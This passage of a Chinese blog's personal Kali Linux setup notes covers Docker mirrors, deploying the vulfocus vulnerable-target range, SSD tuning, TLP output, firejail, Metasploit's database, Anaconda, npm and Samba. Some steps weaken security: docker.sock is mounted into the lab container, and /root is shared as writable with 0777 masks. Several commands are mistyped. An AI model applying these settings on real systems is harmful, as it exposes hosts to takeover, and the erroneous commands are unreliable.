class="string">&quot;https://docker.mirrors.ustc.edu.cn/&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://hub-mirror.c.163.com/&quot;</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">// 重启docker服务</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="搭建vulfocus靶场">搭建vulfocus靶场</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull vulfocus/vulfocus:latest</span><br><span class="line">docker run -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock  -e VUL_IP=scp.com --restart always vulfocus/vulfocus</span><br><span class="line"></span><br><span class="line">vul_ip  为靶场网址(这里scp.com 是ge<span class="string">&#x27;rf&#x27;</span>ue<span class="string">&#x27;vi [ge&#x27;</span>ren<span class="string">&#x27;she&#x27;</span>zhi]本地hosts  方便访问)</span><br></pre></td></tr></table></figure><h2 id="开机自动进入cli">开机自动进入cli</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl set-default multi-user.target</span><br></pre></td></tr></table></figure><h2 id="禁用读文件时访问时间戳的写操作">禁用读文件时访问时间戳的写操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#为除swap之外的每个分区增加noatime选项</span></span><br><span class="line">sudo vim /etc/fstab</span><br><span class="line">noatime,errors=remount-ro</span><br><span class="line"><span class="comment">#重启生效</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210403141014.png" alt="image-20210403141007165"></p><h2 id="使用TRIM定期清理硬盘-ssd">使用TRIM定期清理硬盘(ssd)</h2><h3 id="查看是否支持">查看是否支持</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo hdparm -I /dev/sda | grep TRIM</span><br><span class="line"><span class="comment">#有返回则支持</span></span><br><span class="line">sudo systemctl status fstrim</span><br></pre></td></tr></table></figure><h3 id="手动执行">手动执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo fstrim -V /</span><br><span class="line"><span class="comment">#多块可选择硬盘挂载目录</span></span><br></pre></td></tr></table></figure><h3 id="每天清理-默认每周-—SSD">每天清理(默认每周)—SSD</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -V /etc/systemd/system/fstrim.timer.d</span><br><span class="line">sudo <span class="built_in">touch</span> /etc/systemd/system/fstrim.timer.d/override.conf</span><br><span class="line">sudo vim admin:///etc/systemd/system/fstrim.timer.d/override.conf</span><br><span class="line">[Timer]</span><br><span class="line">OnCalendar=</span><br><span class="line">OnCalendar=daily</span><br></pre></td></tr></table></figure><h2 id="提高性能-安全补丁">提高性能,安全补丁</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#intel</span></span><br><span class="line">sudo apt install intel-microcode</span><br><span class="line"><span class="comment">#amd</span></span><br><span class="line">sudo apt install amd64-microcode</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210403142430.png" alt="image-20210403142423911"></p><h2 id="交换分区-文件">交换分区/文件</h2><ul><li>Swappiness 内核参数(0-100)</li><li>决定RAM写入SWAP的百分比</li><li>减少使用SWAP可以提高性能</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/sys/vm/swappiness <span class="comment">#默认60</span></span><br><span class="line">sudo sysctl -w vm.swappiness=1  <span class="comment">#设置为1    1-10 都行</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210403143159.png" alt="image-20210403143153171"></p><h2 id="限制firefox磁盘读写">限制firefox磁盘读写</h2><ul><li><p>将firefox网络缓存放入RAM可提高运行速度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-------内存不足2GB不建议使用</span><br></pre></td></tr></table></figure></li></ul><p>地址栏输入about:config</p><p>搜索: brower.cache.disk.enable   #更改为false    双击</p><p>搜索: brower.cache.memory.enable #true</p><p>搜索 browser.cache.memory.capacity 数值更改为204800</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210403144502.png" alt="image-20210403144456822"></p><h3 id="禁用firefox无必要的网络活动">禁用firefox无必要的网络活动</h3><p>地址栏输入about:config</p><p>搜索: network.captive-portal-service.enabled #更改为false</p><h2 id="禁用休眠-碎片整理">禁用休眠/碎片整理</h2><p>禁用休眠</p><ul><li>磁盘挂旗会导致大量的写操作</li><li>对SSD尤其不利</li></ul><p>不要碎片整理</p><ul><li>碎片整理会导致大量的写操作,短时间内毁坏SSD</li></ul><h2 id="优化启动项">优化启动项</h2><p>删除不需要的启动项</p><p>显示隐藏启动项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&#x27;s/NoDisplay=true/NoDisplay=false/g&#x27;</span> /etc/xdg/autostart/*.desktop</span><br></pre></td></tr></table></figure><h2 id="系统清理">系统清理</h2><p>stacer</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">af install stacer</span><br></pre></td></tr></table></figure><p>bleachbit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">af install bleachbit</span><br></pre></td></tr></table></figure><h2 id="优化笔记本电池寿命">优化笔记本电池寿命</h2><p>手动优化非常复杂</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#推荐软件</span></span><br><span class="line">af install tlp tlp-rdw</span><br><span class="line">sudo tlp start</span><br><span class="line">sudo tlp-stat</span><br></pre></td></tr></table></figure><p>我用服务器演示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># af install tlp tlp-rdw</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">61b4c3|OK  |   1.9MiB/s|/var/cache/apt/apt-fast/tlp_1.3.1-2_all.deb</span><br><span class="line"></span><br><span class="line">状态标识：</span><br><span class="line">(OK)：下载已完成。</span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树... 完成</span><br><span class="line">正在读取状态信息... 完成</span><br><span class="line">建议安装：</span><br><span class="line">  tp-smapi-dkms acpi-call-dkms linux-cpupower</span><br><span class="line">下列【新】软件包将被安装：</span><br><span class="line">  tlp tlp-rdw</span><br><span class="line">升级了 0 个软件包，新安装了 2 个软件包，要卸载 0 个软件包，有 4 个软件包未被升级。</span><br><span class="line">需要下载 0 B/87.4 kB 的归档。</span><br><span class="line">解压缩后会消耗 403 kB 的额外空间。</span><br><span class="line">正在选中未选择的软件包 tlp。</span><br><span class="line">(正在读取数据库 ... 系统当前共安装有 467060 个文件和目录。)</span><br><span class="line">准备解压 .../archives/tlp_1.3.1-2_all.deb  ...</span><br><span class="line">正在解压 tlp (1.3.1-2) ...</span><br><span class="line">正在选中未选择的软件包 tlp-rdw。</span><br><span class="line">准备解压 .../tlp-rdw_1.3.1-2_all.deb  ...</span><br><span class="line">正在解压 tlp-rdw (1.3.1-2) ...</span><br><span class="line">正在设置 tlp (1.3.1-2) ...</span><br><span class="line">update-rc.d: We have no instructions <span class="keyword">for</span> the tlp init script.</span><br><span class="line">update-rc.d: It looks like a non-network service, we <span class="built_in">enable</span> it.</span><br><span class="line">正在设置 tlp-rdw (1.3.1-2) ...</span><br><span class="line">正在处理用于 man-db (2.9.4-2) 的触发器 ...</span><br><span class="line">正在处理用于 kali-menu (2021.2.0) 的触发器 ...</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># sudo tlp start</span></span><br><span class="line">TLP started <span class="keyword">in</span> AC mode (auto).</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># sudo tlp-stat</span></span><br><span class="line">--- TLP 1.3.1 --------------------------------------------</span><br><span class="line"></span><br><span class="line">+++ Configured Settings:</span><br><span class="line">defaults.conf L0004: TLP_ENABLE=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0005: TLP_PERSISTENT_DEFAULT=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0006: DISK_IDLE_SECS_ON_AC=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0007: DISK_IDLE_SECS_ON_BAT=<span class="string">&quot;2&quot;</span></span><br><span class="line">defaults.conf L0008: MAX_LOST_WORK_SECS_ON_AC=<span class="string">&quot;15&quot;</span></span><br><span class="line">defaults.conf L0009: MAX_LOST_WORK_SECS_ON_BAT=<span class="string">&quot;60&quot;</span></span><br><span class="line">defaults.conf L0010: CPU_ENERGY_PERF_POLICY_ON_AC=<span class="string">&quot;balance_performance&quot;</span></span><br><span class="line">defaults.conf L0011: CPU_ENERGY_PERF_POLICY_ON_BAT=<span class="string">&quot;balance_power&quot;</span></span><br><span class="line">defaults.conf L0012: SCHED_POWERSAVE_ON_AC=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0013: SCHED_POWERSAVE_ON_BAT=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0014: NMI_WATCHDOG=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0015: DISK_DEVICES=<span class="string">&quot;nvme0n1 sda&quot;</span></span><br><span class="line">defaults.conf L0016: DISK_APM_LEVEL_ON_AC=<span class="string">&quot;254 254&quot;</span></span><br><span class="line">defaults.conf L0017: DISK_APM_LEVEL_ON_BAT=<span class="string">&quot;128 128&quot;</span></span><br><span class="line">defaults.conf L0018: DISK_IOSCHED=<span class="string">&quot;keep keep&quot;</span></span><br><span class="line">defaults.conf L0019: SATA_LINKPWR_ON_AC=<span class="string">&quot;med_power_with_dipm max_performance&quot;</span></span><br><span class="line">defaults.conf L0020: SATA_LINKPWR_ON_BAT=<span class="string">&quot;med_power_with_dipm min_power&quot;</span></span><br><span class="line">defaults.conf L0021: AHCI_RUNTIME_PM_TIMEOUT=<span class="string">&quot;15&quot;</span></span><br><span class="line">defaults.conf L0022: PCIE_ASPM_ON_AC=<span class="string">&quot;default&quot;</span></span><br><span class="line">defaults.conf L0023: PCIE_ASPM_ON_BAT=<span class="string">&quot;default&quot;</span></span><br><span class="line">defaults.conf L0024: RADEON_POWER_PROFILE_ON_AC=<span class="string">&quot;default&quot;</span></span><br><span class="line">defaults.conf L0025: RADEON_POWER_PROFILE_ON_BAT=<span class="string">&quot;default&quot;</span></span><br><span class="line">defaults.conf L0026: RADEON_DPM_PERF_LEVEL_ON_AC=<span class="string">&quot;auto&quot;</span></span><br><span class="line">defaults.conf L0027: RADEON_DPM_PERF_LEVEL_ON_BAT=<span class="string">&quot;auto&quot;</span></span><br><span class="line">defaults.conf L0028: WIFI_PWR_ON_AC=<span class="string">&quot;off&quot;</span></span><br><span class="line">defaults.conf L0029: WIFI_PWR_ON_BAT=<span class="string">&quot;on&quot;</span></span><br><span class="line">defaults.conf L0030: WOL_DISABLE=<span class="string">&quot;Y&quot;</span></span><br><span class="line">defaults.conf L0031: SOUND_POWER_SAVE_ON_AC=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0032: SOUND_POWER_SAVE_ON_BAT=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0033: SOUND_POWER_SAVE_CONTROLLER=<span class="string">&quot;Y&quot;</span></span><br><span class="line">defaults.conf L0034: BAY_POWEROFF_ON_AC=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0035: BAY_POWEROFF_ON_BAT=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0036: BAY_DEVICE=<span class="string">&quot;sr0&quot;</span></span><br><span class="line">defaults.conf L0037: RUNTIME_PM_ON_AC=<span class="string">&quot;on&quot;</span></span><br><span class="line">defaults.conf L0038: RUNTIME_PM_ON_BAT=<span class="string">&quot;auto&quot;</span></span><br><span class="line">defaults.conf L0039: RUNTIME_PM_DRIVER_BLACKLIST=<span class="string">&quot;amdgpu mei_me nouveau nvidia pcieport radeon&quot;</span></span><br><span class="line">defaults.conf L0040: USB_AUTOSUSPEND=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0041: USB_BLACKLIST_BTUSB=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0042: USB_BLACKLIST_PHONE=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0043: USB_BLACKLIST_PRINTER=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0044: USB_BLACKLIST_WWAN=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0045: USB_AUTOSUSPEND_DISABLE_ON_SHUTDOWN=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0046: RESTORE_DEVICE_STATE_ON_STARTUP=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0047: RESTORE_THRESHOLDS_ON_BAT=<span class="string">&quot;0&quot;</span></span><br><span class="line">defaults.conf L0048: NATACPI_ENABLE=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0049: TPACPI_ENABLE=<span class="string">&quot;1&quot;</span></span><br><span class="line">defaults.conf L0050: TPSMAPI_ENABLE=<span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">+++ System Info</span><br><span class="line">System         = Tencent Cloud 3.0 CVM</span><br><span class="line">BIOS           = seabios-1.9.1-qemu-project.org</span><br><span class="line">Release        = Kali GNU/Linux Rolling</span><br><span class="line">Kernel         = 5.10.0-kali5-amd64 <span class="comment">#1 SMP Debian 5.10.24-1kali1 (2021-03-23) x86_64</span></span><br><span class="line">/proc/cmdline  = BOOT_IMAGE=/boot/vmlinuz-5.10.0-kali5-amd64 root=UUID=c8ace5dc-4db8-438d-be1f-bfe23e0fba66 ro quiet splash</span><br><span class="line">Init system    = systemd v247 (247.3-3)</span><br><span class="line">Boot mode      = BIOS (CSM, Legacy)</span><br><span class="line">SELinux status = disabled</span><br><span class="line"></span><br><span class="line">+++ TLP Status</span><br><span class="line">State          = enabled</span><br><span class="line">RDW state      = enabled</span><br><span class="line">Last run       = 14时57分20秒,      4 sec(s) ago</span><br><span class="line">Mode           = AC</span><br><span class="line">Power <span class="built_in">source</span>   = unknown</span><br><span class="line"></span><br><span class="line">Notice: tlp.service is not enabled -- invoke <span class="string">&quot;systemctl enable tlp.service&quot;</span> to correct this!</span><br><span class="line"></span><br><span class="line">+++ Processor</span><br><span class="line">CPU model      = AMD EPYC 7K62 48-Core Processor</span><br><span class="line"></span><br><span class="line">/sys/devices/system/cpu/cpufreq/boost                  = (not available)</span><br><span class="line"></span><br><span class="line">Intel EPB: unsupported CPU.</span><br><span class="line"></span><br><span class="line">/sys/module/workqueue/parameters/power_efficient       = N</span><br><span class="line">/proc/sys/kernel/nmi_watchdog                          = 0</span><br><span class="line"></span><br><span class="line">+++ Temperatures</span><br><span class="line">Fan speed              = (not available)</span><br><span class="line"></span><br><span class="line">+++ File System</span><br><span class="line">/proc/sys/vm/laptop_mode               =     0</span><br><span class="line">/proc/sys/vm/dirty_writeback_centisecs =  1500</span><br><span class="line">/proc/sys/vm/dirty_expire_centisecs    =  1500</span><br><span class="line">/proc/sys/vm/dirty_ratio               =    20</span><br><span class="line">/proc/sys/vm/dirty_background_ratio    =    10</span><br><span class="line"></span><br><span class="line">+++ Storage Devices</span><br><span class="line">Devices = nvme0n1 sda</span><br><span class="line"></span><br><span class="line">/dev/nvme0n1: not present.</span><br><span class="line"></span><br><span class="line">/dev/sda: not present.</span><br><span class="line"></span><br><span class="line">+++ AHCI Link Power Management (ALPM)</span><br><span class="line">No AHCI-enabled host controller detected.</span><br><span class="line"></span><br><span class="line">+++ AHCI Host Controller Runtime Power Management</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.1/ata1/power/control = on</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.1/ata2/power/control = on</span><br><span class="line"></span><br><span class="line">+++ Wireless</span><br><span class="line">bluetooth = none (no device)</span><br><span class="line">wifi      = none (no device)</span><br><span class="line">wwan      = none (no device)</span><br><span class="line"></span><br><span class="line">+++ Audio</span><br><span class="line"></span><br><span class="line">+++ PCIe Active State Power Management</span><br><span class="line">/sys/module/pcie_aspm/parameters/policy = [default] performance powersave powersupersave (using BIOS preferences)</span><br><span class="line"></span><br><span class="line">+++ Runtime Power Management</span><br><span class="line">Device blacklist = (not configured)</span><br><span class="line">Driver blacklist = amdgpu mei_me nouveau nvidia pcieport radeon</span><br><span class="line"></span><br><span class="line">/sys/bus/pci/devices/0000:00:00.0/power/control = on   (0x060000, Host bridge, no driver)</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.0/power/control = on   (0x060100, ISA bridge, no driver)</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.1/power/control = on   (0x010180, IDE interface, ata_piix)</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.2/power/control = on   (0x0c0300, USB controller, uhci_hcd)</span><br><span class="line">/sys/bus/pci/devices/0000:00:01.3/power/control = on   (0x068000, Bridge, piix4_smbus)</span><br><span class="line">/sys/bus/pci/devices/0000:00:02.0/power/control = on   (0x030000, VGA compatible controller, cirrus)</span><br><span class="line">/sys/bus/pci/devices/0000:00:03.0/power/control = on   (0x060400, PCI bridge, no driver)</span><br><span class="line">/sys/bus/pci/devices/0000:00:04.0/power/control = on   (0x060400, PCI bridge, no driver)</span><br><span class="line">/sys/bus/pci/devices/0000:00:05.0/power/control = on   (0x020000, Ethernet controller, virtio-pci)</span><br><span class="line">/sys/bus/pci/devices/0000:00:06.0/power/control = on   (0x010000, SCSI storage controller, virtio-pci)</span><br><span class="line">/sys/bus/pci/devices/0000:00:07.0/power/control = on   (0x00ff00, Unclassified device [00ff], virtio-pci)</span><br><span class="line"></span><br><span class="line">+++ USB</span><br><span class="line">Autosuspend         = enabled</span><br><span class="line">Device whitelist    = (not configured)</span><br><span class="line">Device blacklist    = (not configured)</span><br><span class="line">Bluetooth blacklist = disabled</span><br><span class="line">Phone blacklist     = disabled</span><br><span class="line">WWAN blacklist      = disabled</span><br><span class="line"></span><br><span class="line">Bus 001 Device 001 ID 1d6b:0001 control = auto, autosuspend_delay_ms =    0 -- Linux Foundation 1.1 root hub (hub)</span><br><span class="line"></span><br><span class="line">+++ Battery Features: Charge Thresholds and Recalibrate</span><br><span class="line">natacpi    = inactive (no kernel support)</span><br><span class="line">tpacpi-bat = inactive (laptop not supported)</span><br><span class="line">tp-smapi   = inactive (laptop not supported)</span><br><span class="line"></span><br><span class="line">+++ Battery Status</span><br><span class="line">No battery data available.</span><br></pre></td></tr></table></figure><h2 id="限制inode缓存">限制inode缓存</h2><p>建议大于4g内存的计算机限制inode缓存</p><p>代价是某些系统项将在RAM内存中保留更长的时间</p><p>这将减少用于一般任务的可用RAM数量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:///etc/sysctl.conf</span><br><span class="line"><span class="comment">#添加如下</span></span><br><span class="line">vm.vfs_cache_pressure=50</span><br></pre></td></tr></table></figure><h2 id="tmp-放到内存里">/tmp 放到内存里</h2><p>内存大于8g计算机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> -v /usr/share/systemd/tmp.mount /etc/systemd/system/</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> tmp.mount &amp;&amp; reboot</span><br></pre></td></tr></table></figure><p>查看状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status tmp.mount</span><br></pre></td></tr></table></figure><p>取消使用/tmpfs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> -v /etc/systemd/system/tmp.mount</span><br></pre></td></tr></table></figure><h2 id="禁用无线芯片电源管理">禁用无线芯片电源管理</h2><p>以提高用电量为代价,提高速度和无线质量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:///etc/NetworkManager/conf.d/default-wifi-powersave-on.conf</span><br><span class="line"><span class="comment">#修改</span></span><br><span class="line">wifi.powersave = 2</span><br><span class="line"><span class="comment">#重启</span></span><br></pre></td></tr></table></figure><h2 id="partial-reboot-部分重启">partial reboot /部分重启</h2><p>linux如果死机,可尝试partial reboot (ctrl + alt + back)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gedit admin:///etc/default/keyboard</span><br><span class="line">#修改</span><br><span class="line">XKBOPTIONS=&quot;terminate:ctrl_alt_bksp&quot;</span><br><span class="line">#重启</span><br></pre></td></tr></table></figure><h2 id="firejail沙箱">firejail沙箱</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">af install firejail</span><br><span class="line">#使用</span><br><span class="line">firejail firefox</span><br><span class="line">#验证</span><br><span class="line">firejail --tree</span><br></pre></td></tr></table></figure><h2 id="开启数据库">开启数据库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start</span><br><span class="line">msfdb init</span><br></pre></td></tr></table></figure><h2 id="anaconda-安装">anaconda 安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-2021.11-Linux-x86_64.sh</span><br><span class="line"><span class="built_in">chmod</span> +x Anaconda*</span><br><span class="line">./Anaconda*</span><br></pre></td></tr></table></figure><h2 id="npm安装及picgo-core">npm安装及picgo-core</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt -y install npm</span><br><span class="line"><span class="comment">#换源</span></span><br><span class="line">npm config <span class="built_in">set</span> registry  https://registry.npm.taobao.org</span><br><span class="line"><span class="comment">#验证</span></span><br><span class="line">npm config get registry</span><br><span class="line"><span class="comment">#安装picgo</span></span><br><span class="line">npm install -g picgo</span><br></pre></td></tr></table></figure><h2 id="安装smb">安装smb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">apt install samba</span><br><span class="line">vim /etc/samba/smb.conf </span><br><span class="line"></span><br><span class="line">[root]</span><br><span class="line">  comment = share</span><br><span class="line">  path = /root</span><br><span class="line">  available = <span class="built_in">yes</span></span><br><span class="line">  browsable = <span class="built_in">yes</span></span><br><span class="line">  writable = <span class="built_in">yes</span></span><br><span class="line">  create mask = 0777</span><br><span class="line">  directory mask = 0777</span><br><span class="line">  valid <span class="built_in">users</span> = root</span><br><span class="line">  </span><br><span class="line">/etc/init.d/smbd restart   </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="未完待续">未完待续</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;mark class=&quot;hl-label red&quot;&gt;此篇不是教程,只是个人备份,注意切换到root环境运行&lt;/mark&gt; 
&lt;h2 id=&quot;花屏解决&quot;&gt;花屏解决&lt;/h2&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;</summary>
      
    
    
    
    <category term="kali" scheme="https://www.dansemal.cn/categories/kali/"/>
    
    
